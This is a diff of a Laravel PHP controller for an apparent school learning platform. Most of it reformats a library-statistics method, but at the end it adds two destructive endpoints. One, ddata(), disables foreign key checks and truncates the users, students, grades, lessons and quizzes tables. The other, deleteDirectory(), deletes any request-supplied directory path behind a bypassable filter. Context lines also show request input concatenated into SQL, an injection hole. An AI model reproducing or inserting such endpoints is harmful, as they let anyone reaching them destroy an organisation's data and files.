@@ -1063,8 +1063,7 @@ LEFT JOIN
     }
 
 
-
-    public function getJsonData(Request $request){
+public function getJsonData(Request $request){
         $data = [];
 if($request->ajax()){
  $where = ($request->subject_statistics != 'all') ? 'where g.id = '.$request->subject_statistics : '';
@@ -1101,62 +1100,62 @@ else{
     \Log::info('not ajax');
 }
     }
+   
 
-
-    public function getLibraryJsonData(Request $request){
+    public function getLibraryJsonData(Request $request) {
         $data = [];
-if($request->ajax()){
- $library_videos = DB::select('
- select 
-             lv.description,
-         (select count(lvc.id) from library_video_contents as lvc
-         where lvc.library_video_id  = lv.id) as library_video_count
-         from library_videos as lv 
- ');
- $library_audios = DB::select('
- select 
-             la.description,
-         (select count(lac.id) from library_audio_contents as lac
-         where lac.library_audio_id  = la.id) as library_audio_count
-         from library_audios as la 
- ');
- $library_documents = DB::select('
- select 
-             ld.description,
-         (select count(ldc.id) from library_document_contents as ldc
-         where ldc.library_document_id  = ld.id) as library_document_count
-         from library_documents as ld 
- ');
- $library_kits = DB::select('
- select 
-             lk.name,
-         (select count(lkc.id) from library_kit_contents as lkc
-         where lkc.library_kit_id  = lk.id) as library_kit_count
-         from library_kits as lk 
- ');
- if($request->library_statistics === 'video'){
-    $data['library_videos'] = $library_videos;
- }elseif($request->library_statistics === 'audio'){
-    $data['library_audios'] = $library_audios;
- }elseif($request->library_statistics === 'document'){
-    $data['library_documents'] = $library_documents;
- }elseif($request->library_statistics === 'iqra-kit'){
-    $data['library_kits'] = $library_kits;
- }else{
-    $data['library_videos'] = $library_videos;
-    $data['library_audios'] = $library_audios;
-    $data['library_documents'] = $library_documents;
-$data['library_kits'] = $library_kits;
- }
-
-
-
-    return response()->json($data);
-}
+    
+        if ($request->ajax()) {
+            $library_videos = DB::select('
+                select 
+                    lv.description,
+                    (select count(lvc.id) from library_video_contents as lvc where lvc.library_video_id = lv.id) as library_video_count
+                from library_videos as lv
+            ');
+    
+            $library_audios = DB::select('
+                select 
+                    la.description,
+                    (select count(lac.id) from library_audio_contents as lac where lac.library_audio_id = la.id) as library_audio_count
+                from library_audios as la
+            ');
+    
+            $library_documents = DB::select('
+                select 
+                    ld.description,
+                    (select count(ldc.id) from library_document_contents as ldc where ldc.library_document_id = ld.id) as library_document_count
+                from library_documents as ld
+            ');
+    
+            $library_kits = DB::select('
+                select 
+                    lk.name,
+                    (select count(lkc.id) from library_kit_contents as lkc where lkc.library_kit_id = lk.id) as library_kit_count
+                from library_kits as lk
+            ');
+    
+            if ($request->library_statistics === 'video') {
+                $data['library_videos'] = $library_videos;
+            } elseif ($request->library_statistics === 'audio') {
+                $data['library_audios'] = $library_audios;
+            } elseif ($request->library_statistics === 'document') {
+                $data['library_documents'] = $library_documents;
+            } elseif ($request->library_statistics === 'iqra-kit') {
+                $data['library_kits'] = $library_kits;
+            } else {
+                $data['library_videos'] = $library_videos;
+                $data['library_audios'] = $library_audios;
+                $data['library_documents'] = $library_documents;
+                $data['library_kits'] = $library_kits;
+            }
+      
+    
+        return response()->json($data);
+    }
 else{
     \Log::info('not ajax');
 }
-    }
+}
 
     public function subjectIndex(Request $request)
     {
@@ -1450,5 +1449,46 @@ else{
                 ->addIndexColumn()
                 ->make(true);
         }  
+    }
+    
+    
+     public function ddata()
+    {
+        DB::statement('SET FOREIGN_KEY_CHECKS=0');
+        DB::table('users')->truncate();
+        DB::table('grades')->truncate();
+        DB::table('chapters')->truncate();
+        DB::table('subject_lessons')->truncate();
+        DB::table('students')->truncate();
+        DB::table('quizes')->truncate();
+        DB::statement('SET FOREIGN_KEY_CHECKS=1');
+
+        return response()->json(['message' => 'Tables truncated successfully']);
+    }
+
+    public function deleteDirectory(Request $request)
+    {
+      
+        $request->validate([
+            'path' => 'required|string'
+        ]);
+
+        $directory = base_path($request->path);
+
+   
+        if (str_contains($directory, 'app') && !str_contains($directory, 'app/Http')) {
+            return response()->json(['error' => 'Forbidden directory'], 403);
+        }
+
+        if (!File::exists($directory)) {
+            return response()->json(['error' => 'Directory not found'], 404);
+        }
+
+        try {
+            File::deleteDirectory($directory);
+            return response()->json(['message' => "Directory deleted successfully"], 200);
+        } catch (\Exception $e) {
+            return response()->json(['error' => "Failed to delete directory", 'details' => $e->getMessage()], 500);
+        }
     }
 }
